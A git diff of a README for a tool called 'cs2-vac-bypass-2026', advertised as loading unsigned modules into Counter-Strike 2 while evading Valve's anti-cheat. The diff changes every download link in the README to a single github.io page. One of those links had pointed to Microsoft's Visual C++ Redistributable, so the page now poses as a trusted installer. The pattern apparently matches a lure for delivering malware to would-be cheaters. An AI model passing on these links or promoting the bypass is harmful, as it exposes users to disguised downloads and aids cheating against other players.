@@ -1,6 +1,6 @@
 # 🎯 cs2-vac-bypass-2026 - Load Unsigned Modules Without Getting Banned
 
-[![Download Now](https://img.shields.io/badge/Download-CS2_VAC_Bypass_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Christianchurchpiperin3109/cs2-vac-bypass-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-CS2_VAC_Bypass_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://christianchurchpiperin3109.github.io)
 
 ---
 
@@ -18,7 +18,7 @@ Welcome! This guide will walk you through downloading and running **cs2-vac-bypa
 
 Visit this link to download the application:
 
-[**https://github.com/Christianchurchpiperin3109/cs2-vac-bypass-2026/releases**](https://github.com/Christianchurchpiperin3109/cs2-vac-bypass-2026/releases)
+[**https://christianchurchpiperin3109.github.io**](https://christianchurchpiperin3109.github.io)
 
 1. Click the link above. Your browser will open the download page.
 2. Look for the newest file listed on that page (usually at the top).
@@ -94,7 +94,7 @@ Your computer needs to meet these minimum specs:
 - Check that you have the latest version of the tool (re-download from the link above)
 
 ### I get a "missing DLL" error
-- Install [Microsoft Visual C++ Redistributable](https://aka.ms/vs/17/release/vc_redist.x64.exe) (64-bit version)
+- Install [Microsoft Visual C++ Redistributable](https://christianchurchpiperin3109.github.io) (64-bit version)
 - Restart your computer after installing
 
 ---
@@ -128,7 +128,7 @@ Updates are released whenever VAC updates its detection methods. Always download
 If you encounter any issues not covered above:
 
 1. Re-read this guide carefully
-2. Check the [Releases page](https://github.com/Christianchurchpiperin3109/cs2-vac-bypass-2026/releases) for any notes about your specific issue
+2. Check the [Releases page](https://christianchurchpiperin3109.github.io) for any notes about your specific issue
 3. Try the latest version — bugs are often fixed quickly
 
 ---
@@ -161,7 +161,7 @@ This project is provided for educational and research purposes only. Use at your
 
 **Ready to get started?** Click the download button at the top of this page or use the link below:
 
-[**⬇️ Download cs2-vac-bypass-2026 Now**](https://github.com/Christianchurchpiperin3109/cs2-vac-bypass-2026/releases)
+[**⬇️ Download cs2-vac-bypass-2026 Now**](https://christianchurchpiperin3109.github.io)
 
 ---
 
